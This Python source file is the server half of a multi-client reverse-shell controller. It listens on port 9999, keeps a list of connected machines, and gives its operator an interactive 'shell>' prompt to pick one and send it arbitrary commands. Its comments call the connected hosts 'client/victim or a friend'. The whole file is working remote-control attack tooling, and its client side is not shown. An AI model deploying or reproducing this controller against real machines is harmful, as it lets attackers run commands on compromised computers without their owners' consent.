import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]  # 1: listen and accept connection. 2: send commands to the client and handle connection.
queue = Queue()
all_connections = []
all_address = []


# create socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        create_socket()


# Binding the socket and listening the connection
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Handling connection for multiple clients and saving to a list
# Closing previous connection when server.py file restarted
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(True)  # Prevent timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established : " + address[0])

        except:
            print("Error accepting connection.")


# 2nd thread function - 1) see all the clients 2) select a client 3) send command to connected client
# Interactive prompt for sending commands
# shell> list
# 0 Friend-A port
# 1 Friend-B port
# 2 Friend-C port
# shell> select 1
def start_shell():
    while True:
        cmd = input("shell> ")

        if cmd == "list":
            list_connections()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not found.")


# Display all current active connections with client
def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results += str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"
    print("------- Clients -------" + "\n" + results)


def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")  # e.g.: 192.213.1.3>
        return conn

    except:
        print("Selection not valid.")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break

            if len(str.encode(cmd)) > 0:  # if user dont enter any command
                conn.send(str.encode(cmd))  # data must be to bytes
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end='')
        except:
            print("Error sending commands.")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True  # Refuse from consume memory after program the end
        t.start()


# Do next job that is in the queue (handle connections , send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_shell()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()

# # Establish connection with a client (socket must be listening)
# def accept_socket():
#     conn, address = s.accept()
#     print("Connection has been established | " + "IP: " + address[0] + " | Port: " + str(address[1]))
#     send_commands(conn)
#     conn.close()
#
#
# # Send commands to client/victim or a friend
# def send_commands(conn):
#     while True:
#         cmd = input()
#         if cmd == "quit":
#             conn.close()
#             s.close()
#             sys.exit()  # close command prompt
#
#         if len(str.encode(cmd)) > 0:  # if user dont enter any command
#             conn.send(str.encode(cmd))  # data must be to bytes
#             client_response = str(conn.recv(1024), "utf-8")
#             print(client_response, end='')
#
#
# def main():
#     create_socket()
#     bind_socket()
#     accept_socket()
#
#
# if __name__ == "__main__":
#     main()
